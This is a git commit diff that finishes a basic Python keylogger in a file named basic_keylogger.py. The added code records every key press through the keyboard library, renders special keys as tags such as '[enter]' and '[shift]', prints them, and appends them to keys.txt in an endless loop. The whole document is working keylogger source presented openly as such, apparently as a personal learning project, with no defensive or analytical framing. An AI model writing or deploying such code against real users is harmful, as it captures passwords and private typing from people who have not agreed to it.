03824374687b19aff42b6dfa3503cc2633ee1a71
RobertJohnSoler <rsoler@hawk.iit.edu>
2024-11-28 02:00:44 -0600

    basic keylogger in python finished

--- Python/basic_keylogger.py
+++ Python/basic_keylogger.py
@@ -4,8 +4,25 @@ f = open("keys.txt", "w")
 
 while True:
     rk = keyboard.read_event()
+    key = rk.name
     if rk.event_type == "down":
-        print("Logged: ", rk.name)
-        f.write(rk.name)
+        if key == "space":
+            key = " "
+        elif key == "backspace":
+            key = "[backspace]"
+        elif key == "enter":
+            key = "[enter]"
+        elif key == "shift" or key == "right shift":
+            key = "[shift]"
+        elif key == "ctrl" or key == "right ctrl":
+            key = "[ctrl]" 
+        elif key == "caps lock":
+            key = "[caps]"
+        elif key == "tab":
+            key = "[tab]"
+        elif key == "right alt" or key == "alt":
+            key = "[alt]"
+        print("Logged: ", key)
+        f.write(key)
     
 
